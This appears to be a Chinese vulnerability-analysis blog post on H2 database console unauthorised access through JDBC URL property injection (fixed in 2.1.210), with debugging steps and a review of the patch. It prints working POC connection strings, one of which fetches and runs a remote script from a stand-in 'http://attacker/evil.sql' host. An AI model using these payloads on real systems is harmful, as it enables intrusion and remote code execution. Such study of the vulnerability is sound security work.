**漏洞情况简介**

**H2数据库官方介绍**

![](../Images/680bba7dd00b38cd4e814d60370b610c.png)  
**漏洞修复于：2.1.210（2022-01-17），已公开的漏洞利用POC如下：**  
未授权访问：“;IGNORE\_UNKNOWN\_SETTINGS=TRUE;FORBID\_CREATION=FALSE;”  
未授权访问+命令执行：“;IGNORE\_UNKNOWN\_SETTINGS=TRUE;FORBID\_CREATION=FALSE;INIT=RUNSCRIPT FROM 'http://attacker/evil.sql';'\\”  

**越权访问漏洞分析**

**本地环境：windows 10,intellij idea社区版，h2-2.0.206.jar。**  
**漏洞版本下载地址**：https://github.com/h2database/h2database/releases/download/version-2.0.206/h2-2022-01-04.zip  
下载后解压缩，根据/h2/bin/h2.bat文件可知系统控制台启动在jar包中的org.h2.tools.Console中。  
在IDEA中运行Console的main函数即可开启测试环境。控制台界面如下，根据公开的POC得知漏洞利用参数为URL：![](../Images/563ebf7dfb9a98989e2af50e44c3aa7d.png)官方给出的JDBC链接模式有很多，漏洞出现在控制台链接内存数据库模式中，我们使用默认的链接JDBC URL **jdbc:h2:mem:\[databasename\]**，User Name **sa**,Password **空**进行链接，第一次运行时由于sa密码为空，服务端会自动创建数据库，并使我们成功链接该数据库。  
  
连接后使用alter user sa set password ‘\[password\]’,修改sa用户口令：![](../Images/c42621066d9bd7e89c439f1b15b50475.png)  
点击左上角退出链接，重新使用空口令链接会响应（**注：如依然登录成功是因为session中已缓存登录状态，请清空url中的jsessionid**）：![](../Images/08512cacbff051d1177fbb544afbd04a.png)  
**我们使用debug模式跟踪创建jdbc链接的流程：**该控制台登录功能的入口点在\\org\\h2\\server\\web\\WebApp.java的login函数跟踪执行过程，进入抛出异常的server.getConnection![](../Images/26389a29e7d1573cebfba9e56e8893ed.png)我们看到getConnection函数对我们传输的url头进行了校验  
![](../Images/b0d1d674c696df26c32d07125222f31c.png)在进行真正的链接之前还在URL后添加了;FORBID\_CREATION=True。  
  
//接下来省略一部分过程，按照如下函数进入跟踪：![](../Images/869fe5e2ddb4523617c11b1eb25b8332.png)在这里，使用我们传输的jdbc链接相关信息，创建了ConnectionInfo对象，将url中的属性信息添加到该对象的资源属性中，再使用该对象创建真正的链接：  
![](../Images/ee20053b49135059d07695b05223ba64.png)跟进到SessionRemote(ci).connectEmbeddedOrServer->Engine.createSession(ci)-> Engine.openSession(ci)。![](../Images/745d1e227f9eec7a269c56c810635468.png)在openSession函数中，将链接信息对象中的资源值包括IFEXISTS、FORBID\_CREATION、IGNORE\_UNKNOWN\_SETTINGS、CIPHER、INIT。  
  
其中FORBID\_CREATION的值在上述的server.getConnection中添加进URL，并在new ConnectionInfo的过程中赋值给ci的属性，该值被流程设置为true。  
继续跟进openSession()，在该函数中获取对开启数据库会话的状态进行校验，流程走到ci.isPersistent函数时值为false，进入throwNotFound函数，并将上述forbidCreation参数代入。![](../Images/16353e921c3df5c24a36aa357cc1e279.png)由于forbidCreation参数在流程中已经被设置为ture，所以走到第二个判断时由于我们的链接是一个不存在的数据库，且禁止使用该数据库名创建新的库，所以抛出了我们第二次登录时响应的信息。  
![](../Images/08512cacbff051d1177fbb544afbd04a.png)  
回想上述流程，链接时校验的各个属性来源于ConnectionInfo对象，而该对象的属性从url中获取，且url存在字符串拼接的情况，这就导致我们可以操作该流程，使得forbidCreation的值为false，从而在我们输入的数据库名不存在时进行创建。  
观察已公开的POC,在原有url后添加FORBID\_CREATION=FALSE属性使得流程进入到thrownotfound时不再抛出异常，从而继续创建新的数据库，在末尾使用\\转义流程中添加的;FORBID\_CREATION=TRUE，使得该“;”不具备实际参数分割意义，使用IGNORE\_UNKNOWN\_SETTINGS=TRUE避免被转义后的;FORBID\_CREATION作为属性名不在默认配置中导致的异常，最终完成了对数据库的未授权访问。**POC:jdbc:h2:mem:sectest;FORBID\_CREATION=FALSE;IGNORE\_UNKNOWN\_SETTINGS=TRUE;FORBID\_CREATION=FALSE;\\**  
在该流程下新创建的数据库默认会将我们的用户设置为管理员：![](../Images/ec9fc7e94f1ed0c1763c46f040508e53.png)  
至此，未授权访问漏洞部分的分析已经完成。![](../Images/3cbfa0033068236d10bae6eb21eeae39.png)

使得Engine.openSession获取到会话后，进入command.executeUpdate执行我们设置的SQL语句进行查询。![](../Images/123fa356a423aa2ec960253beb958fe5.png)

**修复方案分析**

在IDEA替换h2jar包为h2-2.1.210版本,断点到server\\WebApp\\login函数处、debug启动、登录、修改密码、退出、清空jsessionid，采用exp进行链接。  
跟踪过程到WebServer.getConnection函数首先发现的是，原有的在URL后添加;FORBID\_CREATION=True的过程删除了。![](../Images/87d1b1c72daa881829e348eabfa43767.png)  
对比一下之前版本的代码：![](../Images/0d9830e589ec75861db43c3eff1e7e70.png)  
发现新版JdbcUtils.getConnection()添加了第六个参数，该参数命名为forbidCreation。该参数是由ifExists、allowSecureCreation、key、userKey四个变量进行逻辑运算后获取的一个布尔值。  
其中ifExists默认为true；allowSecureCreation是一个表示是否允许使用秘钥来创建数据库的开关，默认为false；key与userkey分别为本次用户使用的秘钥，以及特权用户的秘钥，用来校验当前用户是否为特权用户。  
如下图所示，最后将用户输入的身份信息及配置信息添加到ConnectionInfo后，无论用户是否在url中输入forbid\_creation，程序会再次依据上述参数重新为该参数赋值，用来实现该参数仅登录后的特权用户可以使用，从而修复了未授权访问漏洞。![](../Images/a391314ddc553100e690789ce6af274a.png)  

**分析过程总结**

**本次分析漏洞并不复杂，重要的是在分析的过程中加深了对该漏洞的理解，例如：**  

1.已公开的POC最后的单引号可以删除。

  

2.理解了新版本的修复方案，可以为以后继续深入研究作为铺垫。

  

3.发现了POC实际执行过程的两个细节，一个是trigger并未真正的添加成功，一个是最后的insert部分原意用来触发trigger，实际上也可以删除了，poc在trigger添加过程中执行，而不是触发时执行。

  
4.学习了使用javascript调用java的方式，将原有写文件poc,修改为弹计算器的poc。
